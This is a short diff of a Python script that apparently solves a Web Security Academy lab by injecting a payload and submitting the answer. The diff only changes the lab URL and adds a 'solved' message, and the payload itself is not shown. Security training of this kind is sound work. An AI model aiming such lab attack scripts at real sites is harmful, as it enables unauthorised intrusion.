@@ -21,7 +21,7 @@ from colorama import Fore
 import base64
 
 # change this url to your lab
-url = "https://0a0900bc042ce79689a248530001003d.web-security-academy.net"
+url = "https://0a7d00d0045a445f827ac9d7003b00ce.web-security-academy.net"
 
 try:
     inject_payload = requests.get(
@@ -40,6 +40,8 @@ try:
                 f"{url}/submitsolution", data)  # submit the answer
             if submit_answer.status_code == 200:
                 print(Fore.WHITE + "3. Submitting the answer.. " + Fore.GREEN + "OK")
+                print(
+                    Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
         except:
             print(Fore.RED + "[!] Failed to submit the answer")
 except:
